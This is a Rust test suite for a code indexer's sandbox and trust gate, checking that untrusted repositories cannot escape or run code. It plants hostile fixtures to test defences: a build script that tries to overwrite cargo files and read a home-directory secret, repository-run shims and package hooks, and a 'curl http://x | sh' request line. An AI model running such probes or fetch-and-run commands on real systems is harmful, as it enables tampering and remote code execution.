//! Indexing (spec §9.1, §12): the trust gate, the sandbox against a hostile build script,
//! scip-python's environment, and the request path from inside a sandbox.
//!
//! The tests that run real indexers exec the bwrap command line directly, never through systemd,
//! and are skipped when bwrap, rust-analyzer or scip-python is not installed. Every path they write
//! is a temporary directory; the user's own home, cargo home and caches are never touched.

mod common;

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;

use ling_code::index::{plan, sandbox};
use ling_code::paths::Repo;

struct Env {
    _dir: tempfile::TempDir,
    home: PathBuf,
}

/// Points HOME, CARGO_HOME, scratch and runtime at temporary directories, once for this test
/// binary, after recording where the real toolchain and pinned tools are (read-only use).
fn env() -> &'static Env {
    static ENV: OnceLock<Env> = OnceLock::new();
    ENV.get_or_init(|| {
        let real_home = ling_code::paths::home();
        std::env::set_var("RUSTUP_HOME", std::env::var("RUSTUP_HOME").unwrap_or_else(|_| real_home.join(".rustup").to_string_lossy().into()));
        std::env::set_var("MIGHTLING_CODE_TOOLS_DIR", ling_code::paths::install_bin_dir());
        std::env::set_var("MIGHTLING_CODE_INDEXERS_DIR", ling_code::paths::indexers_dir());
        std::env::set_var("MIGHTLING_CODE_SELF", env!("CARGO_BIN_EXE_ling-code"));
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().join("home");
        std::fs::create_dir_all(home.join(".cargo/bin")).unwrap();
        // rust-analyzer runs `$CARGO_HOME/bin/cargo`: the test's own cargo home points it at the
        // pinned toolchain's cargo, and a build script must not be able to replace it.
        if let Some((_, _, toolchain_bin)) = plan::Tools::find().rust_analyzer {
            std::os::unix::fs::symlink(toolchain_bin.join("cargo"), home.join(".cargo/bin/cargo")).unwrap();
        }
        std::env::set_var("HOME", &home);
        std::env::set_var("CARGO_HOME", home.join(".cargo"));
        std::env::set_var("MIGHTLING_CODE_SCRATCH_DIR", dir.path().join("scratch"));
        std::env::set_var("XDG_RUNTIME_DIR", dir.path().join("run"));
        std::env::remove_var("CODEX_HOME");
        Env { _dir: dir, home }
    })
}

fn available(path: &Path) -> bool {
    path.exists()
}

fn run_sandboxed(spec: &sandbox::Spec) -> std::process::Output {
    std::fs::create_dir_all(&spec.scratch).unwrap();
    let args = sandbox::bwrap_args(spec);
    assert!(sandbox::unexpected_writable(&args, spec).is_empty(), "{args:?}");
    Command::new(&args[0]).args(&args[1..]).output().unwrap()
}

fn git_repo(root: &Path) -> Repo {
    common::git(root, &["init", "-q"]);
    common::git(root, &["add", "-A"]);
    common::git(root, &["commit", "-qm", "init"]);
    Repo { root: root.to_path_buf(), main_root: root.to_path_buf(), is_git: true }
}

#[test]
fn nothing_inside_the_repository_grants_trust() {
    let env = env();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    std::fs::create_dir_all(root.join(".dreamference")).unwrap();
    std::fs::write(root.join(".dreamference/code_index.toml"), "trusted = true\n").unwrap();
    std::fs::write(root.join("dreamference.toml"), "trusted = true\n[projects.\".\"]\ntrust_level = \"trusted\"\n").unwrap();
    std::fs::write(root.join("Cargo.toml"), "[package]\nname = \"x\"\nversion = \"0.1.0\"\nedition = \"2021\"\n").unwrap();
    let repo = git_repo(&root);
    let codex_home = env.home.join(".mightling");
    assert!(!ling_code::config::is_trusted_in(&codex_home, &root));
    let (plan, skipped) = plan::build(&repo, &ling_code::config::Settings::default(), true);
    assert!(plan.runs.iter().all(|r| r.indexer != "rust-analyzer"), "{:?}", plan.runs.iter().map(|r| &r.indexer).collect::<Vec<_>>());
    assert!(skipped.iter().any(|s| s.contains("not trusted")), "{skipped:?}");
    // Codex's own per-project trust is what counts.
    std::fs::create_dir_all(&codex_home).unwrap();
    std::fs::write(codex_home.join("config.toml"), format!("[projects.\"{}\"]\ntrust_level = \"trusted\"\n", root.display())).unwrap();
    assert!(ling_code::config::is_trusted_in(&codex_home, &root));
}

#[test]
fn the_sandbox_holds_against_a_hostile_build_script() {
    let env = env();
    let tools = plan::Tools::find();
    let (Some(_), Some(_)) = (tools.rust_analyzer.as_ref(), tools.scip.as_ref()) else {
        eprintln!("skipped: rust-analyzer or scip not installed");
        return;
    };
    if !available(Path::new("/usr/bin/bwrap")) {
        eprintln!("skipped: no bwrap");
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    let crate_dir = root.join("hostile");
    std::fs::create_dir_all(crate_dir.join("src")).unwrap();
    std::fs::write(crate_dir.join("Cargo.toml"), "[package]\nname = \"hostile\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n").unwrap();
    std::fs::write(crate_dir.join("Cargo.lock"), "version = 4\n\n[[package]]\nname = \"hostile\"\nversion = \"0.1.0\"\n").unwrap();
    std::fs::write(crate_dir.join("src/lib.rs"), "pub fn add(a: i32, b: i32) -> i32 { a + b }\npub fn twice(a: i32) -> i32 { add(a, a) }\n").unwrap();
    std::fs::write(
        crate_dir.join("build.rs"),
        r#"fn main() {
    let cargo_home = std::env::var("CARGO_HOME").unwrap();
    let home = std::env::var("PROBE_HOME").unwrap();
    let repo = std::env::var("PROBE_REPO").unwrap();
    let report = format!(
        "create_in_cargo_home={}\nopen_cargo_bin_for_writing={}\nread_home_marker={}\noverwrite_index_db={}\n",
        std::fs::write(format!("{cargo_home}/pwned"), "x").is_ok(),
        std::fs::OpenOptions::new().write(true).open(format!("{cargo_home}/bin/cargo")).is_ok(),
        std::fs::read_to_string(format!("{home}/marker")).is_ok(),
        std::fs::write(format!("{repo}/.dreamference/scip/index.db"), "pwned").is_ok(),
    );
    std::fs::write(format!("{}/report.txt", std::env::var("OUT_DIR").unwrap()), report).unwrap();
}
"#,
    )
    .unwrap();
    std::fs::create_dir_all(root.join(".dreamference/scip")).unwrap();
    std::fs::write(root.join(".dreamference/scip/index.db"), "the last good store").unwrap();
    std::fs::write(env.home.join("marker"), "secret").unwrap();
    let repo = git_repo(&root);
    let target = plan::Target::new(ling_code::index::host::Kind::Executing, "rust-analyzer", "hostile");
    let mut run = plan::exact_run(&repo, &ling_code::config::Settings::default(), &tools, &target, 0).unwrap();
    run.spec.env.push(("PROBE_HOME".into(), env.home.to_string_lossy().into()));
    run.spec.env.push(("PROBE_REPO".into(), root.to_string_lossy().into()));
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}", String::from_utf8_lossy(&output.stderr));
    // The index was written, to scratch only.
    assert!(run.scip_output.as_ref().unwrap().is_file());
    assert!(run.converted.as_ref().unwrap().is_file());
    // The build script ran, and every attempt failed.
    let report = find(&run.spec.scratch.join("target"), "report.txt").expect("the build script ran");
    let report = std::fs::read_to_string(report).unwrap();
    assert_eq!(
        report,
        "create_in_cargo_home=false\nopen_cargo_bin_for_writing=false\nread_home_marker=false\noverwrite_index_db=false\n"
    );
    assert!(!env.home.join(".cargo/pwned").exists());
    assert_eq!(std::fs::read_to_string(root.join(".dreamference/scip/index.db")).unwrap(), "the last good store");
    assert!(common::git(&root, &["status", "--porcelain", "hostile"]).is_empty(), "the source was written to");
}

fn find(dir: &Path, name: &str) -> Option<PathBuf> {
    for entry in std::fs::read_dir(dir).ok()?.flatten() {
        let path = entry.path();
        if path.file_name().map(|n| n == name).unwrap_or(false) {
            return Some(path);
        }
        if path.is_dir() {
            if let Some(found) = find(&path, name) {
                return Some(found);
            }
        }
    }
    None
}

#[test]
fn scip_python_runs_nothing_from_the_repository() {
    let _env = env();
    let tools = plan::Tools::find();
    let (Some(_), Some(_)) = (tools.scip_python.as_ref(), tools.scip.as_ref()) else {
        eprintln!("skipped: scip-python or scip not installed");
        return;
    };
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    std::fs::create_dir_all(root.join("pkg")).unwrap();
    std::fs::create_dir_all(root.join(".venv/bin")).unwrap();
    std::fs::write(root.join("pkg/__init__.py"), "def f():\n    return 1\n\nX = f()\n").unwrap();
    let marker = dir.path().join("ran");
    for script in [".venv/bin/python3", ".venv/bin/python", ".venv/bin/pip3", "python3", "pip3"] {
        std::fs::write(root.join(script), format!("#!/bin/sh\ntouch {}\n", marker.display())).unwrap();
        let mut perms = std::fs::metadata(root.join(script)).unwrap().permissions();
        std::os::unix::fs::PermissionsExt::set_mode(&mut perms, 0o755);
        std::fs::set_permissions(root.join(script), perms).unwrap();
    }
    std::fs::write(root.join("sitecustomize.py"), format!("open('{}', 'w').close()\n", marker.display())).unwrap();
    let repo = git_repo(&root);
    let target = plan::Target::new(ling_code::index::host::Kind::Static, "scip-python", "pkg");
    let run = plan::exact_run(&repo, &ling_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}", String::from_utf8_lossy(&output.stderr));
    assert!(run.converted.as_ref().unwrap().is_file());
    assert!(!marker.exists(), "something from the repository ran");
}

/// Installs a finished run's store as the supervisor does, and opens it.
fn install_and_open(repo: &Repo, run: &plan::Run) -> ling_code::scip_store::ScipStore {
    let entry = ling_code::manifest::RunEntry {
        indexer: run.indexer.clone(),
        root: run.root.clone(),
        path_prefix: run.path_prefix.clone(),
        version: run.version.clone(),
        commit: repo.head(),
        ..Default::default()
    };
    let entry = ling_code::index::store::install(repo, entry, run.converted.as_ref().unwrap(), run.scip_output.as_ref().unwrap()).unwrap();
    ling_code::scip_store::ScipStore::open(&repo.scip_dir().join(&entry.store), entry).unwrap()
}

#[test]
fn a_python_file_at_the_root_gets_an_exact_index_of_its_own() {
    let _env = env();
    let tools = plan::Tools::find();
    let (Some(_), Some(_)) = (tools.scip_python.as_ref(), tools.scip.as_ref()) else {
        eprintln!("skipped: scip-python or scip not installed");
        return;
    };
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    std::fs::create_dir_all(root.join("pkg")).unwrap();
    std::fs::write(root.join("pkg/__init__.py"), "def area(r):\n    return 3 * r * r\n").unwrap();
    std::fs::write(root.join("helpers.py"), "def twice(x):\n    return 2 * x\n").unwrap();
    std::fs::write(root.join("main.py"), "from pkg import area\nfrom helpers import twice\n\n\ndef report(r):\n    return twice(area(r))\n\n\nprint(report(2))\n").unwrap();
    let repo = git_repo(&root);
    let targets = plan::detect(&repo);
    let target = targets.iter().find(|t| t.indexer == "scip-python" && t.root == "main.py").expect("the root file is a root").clone();
    let run = plan::exact_run(&repo, &ling_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    let store = install_and_open(&repo, &run);
    // The file is a document under its own name, not under the directory roots' or `.`.
    assert!(store.covers("main.py"), "{:?}", store.documents());
    assert!(!store.documents().iter().any(|d| d.starts_with("main.py/") || d.is_empty()), "{:?}", store.documents());
    let report = store.definitions_named(&["report".to_string()]).unwrap();
    assert_eq!(report.iter().map(|d| (d.path.as_str(), d.line)).collect::<Vec<_>>(), [("main.py", 5)]);
    // Its uses of what it imports, from a package and from another root file, are exact
    // references in this store.
    for (name, line) in [("area", 6), ("twice", 6)] {
        let used: Vec<(String, u32)> = store
            .occurrences_within("main.py", (5, 6))
            .unwrap()
            .into_iter()
            .filter(|o| o.symbol.contains(&format!("/{name}().")))
            .map(|o| (o.path, o.line))
            .collect();
        assert_eq!(used, [("main.py".to_string(), line)], "{name}");
    }
    assert!(common::git(&root, &["status", "--porcelain", "--untracked-files=all"]).lines().all(|l| l.contains(".dreamference/")), "the tree was written to");
}

#[test]
fn rust_in_a_submodule_is_indexed_from_a_scratch_copy_and_the_checkout_is_untouched() {
    let _env = env();
    let tools = plan::Tools::find();
    let (Some(_), Some(_)) = (tools.rust_analyzer.as_ref(), tools.scip.as_ref()) else {
        eprintln!("skipped: rust-analyzer or scip not installed");
        return;
    };
    if !available(Path::new("/usr/bin/bwrap")) {
        eprintln!("skipped: no bwrap");
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    // The library: two crates, one depending on the other by path, and a build script that
    // generates a file beside its manifest, as code generators do.
    let lib = dir.path().join("origin-lib");
    std::fs::create_dir_all(lib.join("geo/src")).unwrap();
    std::fs::create_dir_all(lib.join("util/src")).unwrap();
    std::fs::write(lib.join("util/Cargo.toml"), "[package]\nname = \"util\"\nversion = \"0.1.0\"\nedition = \"2021\"\n").unwrap();
    std::fs::write(lib.join("util/src/lib.rs"), "pub fn square(x: f64) -> f64 { x * x }\n").unwrap();
std::fs::write(lib.join("geo/Cargo.toml"), "[package]\nname = \"geo\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n\n[dependencies]\nutil = { path = \"../util\" }\n").unwrap();
    std::fs::write(
        lib.join("geo/build.rs"),
        "fn main() {\n    let dir = std::env::var(\"CARGO_MANIFEST_DIR\").unwrap();\n    std::fs::write(format!(\"{dir}/generated.txt\"), \"generated\").unwrap();\n}\n",
    )
    .unwrap();
    std::fs::write(lib.join("geo/src/lib.rs"), "pub fn area(r: f64) -> f64 {\n    3.0 * util::square(r)\n}\n").unwrap();
    git_repo(&lib);
    let root = dir.path().join("repo");
    std::fs::create_dir_all(&root).unwrap();
    std::fs::write(root.join("README.md"), "super\n").unwrap();
    let repo = git_repo(&root);
    common::git(&root, &["-c", "protocol.file.allow=always", "submodule", "add", "-q", &lib.to_string_lossy(), "vendor"]);
    common::git(&root, &["commit", "-qm", "add the submodule"]);
    let decisions = ling_code::submodules::evaluate_with(&repo, 5000, &[("vendor".to_string(), ling_code::submodules::Choice::Include)]);
    let (targets, _) = plan::detect_in_submodules(&repo, &decisions);
    let target = targets.iter().find(|t| t.indexer == "rust-analyzer" && t.root == "vendor/geo").expect("the crate is detected").clone();
    assert_eq!(target.submodule, "vendor");
    let run = plan::exact_run(&repo, &ling_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    // The build wrote beside its manifest, in the copy; the submodule's checkout is exactly as
    // committed.
    assert!(run.spec.scratch.join("src/geo/generated.txt").is_file(), "the workspace was not the copy");
    assert!(!root.join("vendor/geo/generated.txt").exists());
    assert!(common::git(&root.join("vendor"), &["status", "--porcelain", "--untracked-files=all"]).is_empty(), "the submodule was written to");
    // The store's paths are the checkout's, and the path dependency inside the submodule resolved.
    let store = install_and_open(&repo, &run);
    assert!(store.covers("vendor/geo/src/lib.rs"), "{:?}", store.documents());
    let area = store.definitions_named(&["area".to_string()]).unwrap();
    assert_eq!(area.iter().map(|d| (d.path.as_str(), d.line)).collect::<Vec<_>>(), [("vendor/geo/src/lib.rs", 1)]);
    let uses: Vec<String> = store.occurrences_within("vendor/geo/src/lib.rs", (1, 3)).unwrap().into_iter().filter(|o| o.symbol.contains("square")).map(|o| o.symbol).collect();
    assert_eq!(uses.len(), 1, "{uses:?}");
    assert!(uses[0].contains("util"), "{uses:?}");
}

#[test]
fn scip_typescript_writes_nothing_into_the_tree_and_runs_nothing_from_it() {
    let _env = env();
    let tools = plan::Tools::find();
    let (Some(_), Some(_)) = (tools.scip_typescript.as_ref(), tools.scip.as_ref()) else {
        eprintln!("skipped: scip-typescript or scip not installed");
        return;
    };
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    let marker = dir.path().join("ran");
    std::fs::create_dir_all(root.join("web/lib")).unwrap();
    // A JavaScript project with no tsconfig, whose package scripts would leave a marker if run.
    let touch = format!("touch {}", marker.display());
    std::fs::write(
        root.join("web/package.json"),
        format!("{{\"name\":\"web\",\"version\":\"1.0.0\",\"scripts\":{{\"prepare\":\"{touch}\",\"postinstall\":\"{touch}\"}}}}"),
    )
    .unwrap();
    std::fs::write(root.join("web/lib/math.js"), "function add(a, b) { return a + b; }\nmodule.exports = { add };\n").unwrap();
    std::fs::write(root.join("web/index.js"), "const { add } = require('./lib/math');\nconsole.log(add(1, 2));\n").unwrap();
    let repo = git_repo(&root);
    let targets = plan::detect(&repo);
    let target = targets.iter().find(|t| t.indexer == "scip-typescript").expect("detected").clone();
    let run = plan::exact_run(&repo, &ling_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    assert!(run.converted.as_ref().unwrap().is_file());
    // The inferred configuration went to scratch: the tree is exactly as committed.
    assert!(common::git(&root, &["status", "--porcelain", "--untracked-files=all"]).is_empty(), "the tree was written to");
    assert!(!marker.exists(), "a package script ran");
}

/// scip-go and a Go toolchain, from the install or, for a run on a machine without Go installed,
/// from `MIGHTLING_CODE_TEST_SCIP_GO` and `MIGHTLING_CODE_TEST_GOROOT` (paths outside the home directory,
/// which the sandbox hides).
fn go_tools() -> Option<plan::Tools> {
    let tools = plan::Tools::find();
    let from_env = std::env::var_os("MIGHTLING_CODE_TEST_SCIP_GO").map(PathBuf::from).zip(std::env::var_os("MIGHTLING_CODE_TEST_GOROOT").map(PathBuf::from));
    let scip_go = tools.scip_go.clone().or(from_env)?;
    tools.scip.as_ref()?;
    Some(plan::Tools { scip_go: Some(scip_go), ..tools })
}

#[test]
fn scip_go_indexes_offline_and_refuses_a_toolchain_download() {
    let _env = env();
    let Some(tools) = go_tools() else {
        eprintln!("skipped: scip-go or a Go toolchain not installed");
        return;
    };
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    copy_dir(&common::fixture_dir().join("langs/gogeom"), &root);
    // A dependency that is in no module cache: indexing still succeeds, offline, without it.
    std::fs::write(root.join("go.mod"), "module example.com/gogeom\n\ngo 1.22\n\nrequire github.com/google/uuid v1.6.0\n").unwrap();
    std::fs::write(root.join("shapes/id.go"), "package shapes\n\nimport \"github.com/google/uuid\"\n\nvar ID = uuid.New()\n").unwrap();
    let repo = git_repo(&root);
    let target = plan::detect(&repo).into_iter().find(|t| t.indexer == "scip-go").expect("detected");
    assert!(target.on_demand);
    let run = plan::exact_run(&repo, &ling_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    assert!(run.converted.as_ref().unwrap().is_file());
    assert!(common::git(&root, &["status", "--porcelain", "--untracked-files=all"]).is_empty(), "the module was written to");
    // A go.mod naming a newer Go fails here instead of downloading that toolchain.
    std::fs::write(root.join("go.mod"), "module example.com/gogeom\n\ngo 1.99\n").unwrap();
    std::fs::remove_file(root.join("shapes/id.go")).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(!output.status.success());
    let text = format!("{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    assert!(text.contains("GOTOOLCHAIN=local"), "{text}");
}

/// A fixture project as the directory `name` of a fresh repository.
fn language_repo(dir: &Path, fixture: &str, name: &str) -> (PathBuf, Repo) {
    let root = dir.join("repo");
    copy_dir(&common::fixture_dir().join("langs").join(fixture), &root.join(name));
    let repo = git_repo(&root);
    (root, repo)
}

/// scip-java, a JDK and Gradle, and scip-dotnet with its SDK, come from the install; on a machine
/// that has none (this one), from an install made elsewhere and named by `MIGHTLING_CODE_TOOLS_DIR`
/// and `MIGHTLING_CODE_INDEXERS_DIR` (outside the home directory, which the sandbox hides). The two
/// tests below are skipped without them.
#[test]
fn scip_java_builds_a_gradle_project_offline_in_a_copy() {
    let _env = env();
    let tools = plan::Tools::find();
    let gradle = tools.java_build_tools.iter().any(|home| home.join("bin/gradle").is_file()) || Path::new("/usr/bin/gradle").is_file();
    if tools.scip_java.is_none() || tools.scip.is_none() || !gradle {
        eprintln!("skipped: scip-java, a JDK 17 or Gradle not installed");
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let (root, repo) = language_repo(dir.path(), "javageom", "jvm");
    let target = plan::detect(&repo).into_iter().find(|t| t.indexer == "scip-java").expect("detected");
    assert_eq!((target.root.as_str(), target.kind), ("jvm", ling_code::index::host::Kind::Executing));
    let run = plan::exact_run(&repo, &ling_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    // Gradle built the copy: no build/ or .gradle/ in the project.
    assert!(run.spec.scratch.join("src/build").is_dir(), "the build did not run in the copy");
    assert!(common::git(&root, &["status", "--porcelain", "--untracked-files=all"]).is_empty(), "the project was written to");
    let store = install_and_open(&repo, &run);
    assert!(store.covers("jvm/src/main/java/geom/Disk.java"), "{:?}", store.documents());
    let make = store.definitions_named(&["makeDisk".to_string()]).unwrap();
    assert_eq!(make.iter().map(|d| (d.path.as_str(), d.line)).collect::<Vec<_>>(), [("jvm/src/main/java/geom/Disk.java", 12)]);
    let uses: Vec<(String, u32)> =
        store.occurrences_of(make[0].symbol_id, &make[0].symbol).unwrap().into_iter().filter(|o| o.roles & 1 == 0).map(|o| (o.path, o.line)).collect();
    assert_eq!(uses, [("jvm/src/main/java/geom/Report.java".to_string(), 8)]);
}

#[test]
fn scip_dotnet_restores_and_indexes_offline_in_a_copy() {
    let _env = env();
    let tools = plan::Tools::find();
    if tools.scip_dotnet.is_none() || tools.scip.is_none() {
        eprintln!("skipped: scip-dotnet or a .NET SDK not installed");
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let (root, repo) = language_repo(dir.path(), "dotnetgeom", "net");
    let target = plan::detect(&repo).into_iter().find(|t| t.indexer == "scip-dotnet").expect("detected");
    assert_eq!((target.root.as_str(), target.file.as_str()), ("net", "Geom.csproj"));
    let run = plan::exact_run(&repo, &ling_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    let log = format!("{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    assert!(output.status.success(), "{log}");
    // The restore succeeded with no feed: a failed one would leave an index without the
    // project's packages, and scip-dotnet would still exit 0.
    assert!(log.contains("Restored ") && !log.contains("error NU"), "{log}");
    // obj/ and bin/ are in the copy only, and are not documents.
    assert!(common::git(&root, &["status", "--porcelain", "--untracked-files=all"]).is_empty(), "the project was written to");
    let store = install_and_open(&repo, &run);
    assert_eq!(store.documents().into_iter().collect::<Vec<_>>(), ["net/Program.cs", "net/Shapes.cs"]);
    let make = store.definitions_named(&["MakeDisk".to_string()]).unwrap();
    assert_eq!(make.iter().map(|d| (d.path.as_str(), d.line)).collect::<Vec<_>>(), [("net/Shapes.cs", 37)]);
    let uses: Vec<(String, u32)> =
        store.occurrences_of(make[0].symbol_id, &make[0].symbol).unwrap().into_iter().filter(|o| o.roles & 1 == 0).map(|o| (o.path, o.line)).collect();
    assert_eq!(uses, [("net/Program.cs".to_string(), 7)]);
    // A package that is on no disk is the accepted failure, and no index is written for it.
    std::fs::write(
        root.join("net/Geom.csproj"),
        "<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include=\"Not.On.This.Disk\" Version=\"1.0.0\" /></ItemGroup></Project>\n",
    )
    .unwrap();
    common::git(&root, &["commit", "-qam", "a package nobody has"]);
    let output = run_sandboxed(&run.spec);
    let log = format!("{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    assert!(!output.status.success(), "{log}");
    assert!(ling_code::index::supervisor::is_offline_failure(&log), "{log}");
    assert!(!run.converted.as_ref().unwrap().is_file(), "an index was written without the project's packages");
}

fn copy_dir(from: &Path, to: &Path) {
    std::fs::create_dir_all(to).unwrap();
    for entry in std::fs::read_dir(from).unwrap().flatten() {
        let target = to.join(entry.file_name());
        if entry.file_type().unwrap().is_dir() {
            copy_dir(&entry.path(), &target);
        } else {
            std::fs::copy(entry.path(), target).unwrap();
        }
    }
}

#[test]
fn an_untrusted_repository_never_builds_java_or_dotnet() {
    let env = env();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    let marker = dir.path().join("built");
    // Each build would leave the marker: Gradle at configuration time, MSBuild before the build.
    std::fs::create_dir_all(root.join("jvm")).unwrap();
    std::fs::write(root.join("jvm/build.gradle"), format!("new File('{}').text = 'gradle'\n", marker.display())).unwrap();
    std::fs::create_dir_all(root.join("net")).unwrap();
    std::fs::write(
        root.join("net/App.csproj"),
        format!("<Project Sdk=\"Microsoft.NET.Sdk\"><Target Name=\"Mark\" BeforeTargets=\"Restore;Build\"><Touch Files=\"{}\" AlwaysCreate=\"true\" /></Target></Project>\n", marker.display()),
    )
    .unwrap();
    std::fs::write(root.join("dreamference.toml"), "trusted = true\n").unwrap();
    let repo = git_repo(&root);
    assert!(!ling_code::config::is_trusted_in(&env.home.join(".mightling"), &root));
    let detected: Vec<&str> = plan::detect(&repo).iter().map(|t| t.indexer).collect();
    assert!(detected.contains(&"scip-java") && detected.contains(&"scip-dotnet"), "{detected:?}");
    let (plan, skipped) = plan::build_with(&repo, &ling_code::config::Settings::default(), true, true);
    assert!(plan.runs.iter().all(|r| r.indexer != "scip-java" && r.indexer != "scip-dotnet"), "{:?}", plan.runs.iter().map(|r| &r.indexer).collect::<Vec<_>>());
    for indexer in ["scip-java", "scip-dotnet"] {
        assert!(skipped.iter().any(|s| s.starts_with(indexer) && s.contains("not trusted")), "{skipped:?}");
    }
    assert!(!marker.exists());
}

#[test]
fn indexing_from_inside_a_sandbox_queues_a_request() {
    let f = common::fixture();
    // The fixture's runner points XDG_RUNTIME_DIR at an empty directory: no systemd bus, as
    // inside Codex's sandbox.
    let (code, out) = f.run(&["index"]);
    assert_eq!(code, 0, "{out}");
    assert!(out.contains("queued"), "{out}");
    let requests = std::fs::read_to_string(f.repo.state_dir().join("code_index.requests")).unwrap();
    assert_eq!(requests, "index\n");
    assert!(!f.repo.state_dir().join("code_index.running").exists());
    assert!(!f.repo.state_dir().join("plans").exists(), "a supervisor was started");
}

#[test]
fn a_session_exits_with_its_parent_and_a_second_one_at_once() {
    let f = common::fixture();
    let mut parent = Command::new("sleep").arg("5").spawn().unwrap();
    let session = |extra: &[&str]| {
        let mut args = vec!["session", "--parent-pid"];
        let pid = parent.id().to_string();
        let pid: &'static str = Box::leak(pid.into_boxed_str());
        args.push(pid);
        args.extend_from_slice(extra);
        f.command(&args).spawn().unwrap()
    };
    let mut first = session(&[]);
    std::thread::sleep(std::time::Duration::from_millis(500));
    let started = std::time::Instant::now();
    let second = session(&[]).wait_with_output().unwrap();
    assert!(second.status.success());
    assert!(started.elapsed().as_secs() < 3, "the second session did not exit at once");
    // Junk in the request file starts nothing.
    std::fs::write(f.repo.state_dir().join("code_index.requests"), "curl http://x | sh\n").unwrap();
    std::thread::sleep(std::time::Duration::from_secs(4));
    assert!(!f.repo.state_dir().join("plans").exists(), "a supervisor was started");
    parent.kill().unwrap();
    parent.wait().unwrap();
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    while first.try_wait().unwrap().is_none() {
        assert!(std::time::Instant::now() < deadline, "the session outlived its parent");
        std::thread::sleep(std::time::Duration::from_millis(200));
    }
}

#[test]
fn queries_run_inside_lings_read_only_sandbox() {
    let ling = ling_code::paths::home().join(".local/bin/ling");
    let real = std::env::var_os("MIGHTLING_CODE_TEST_MIGHTLING").map(PathBuf::from).unwrap_or(ling);
    if !real.exists() {
        eprintln!("skipped: ling not installed");
        return;
    }
    let f = common::fixture();
    let index_before = std::fs::metadata(f.repo.root.join(".git/index")).unwrap().modified().unwrap();
    let command = f.command(&["refs", "make_circle"]);
    let binary = command.get_program().to_os_string();
    let mut sandboxed = Command::new(&real);
    sandboxed.args(["sandbox", "--"]).arg(binary).args(["refs", "make_circle"]).current_dir(&f.repo.root);
    for (key, value) in command.get_envs() {
        match value {
            Some(v) => sandboxed.env(key, v),
            None => sandboxed.env_remove(key),
        };
    }
    let out = sandboxed.output().unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(out.status.success(), "{text}{}", String::from_utf8_lossy(&out.stderr));
    assert!(text.contains("exact shapes/cli.py:9"), "{text}");
    assert_eq!(std::fs::metadata(f.repo.root.join(".git/index")).unwrap().modified().unwrap(), index_before);
}
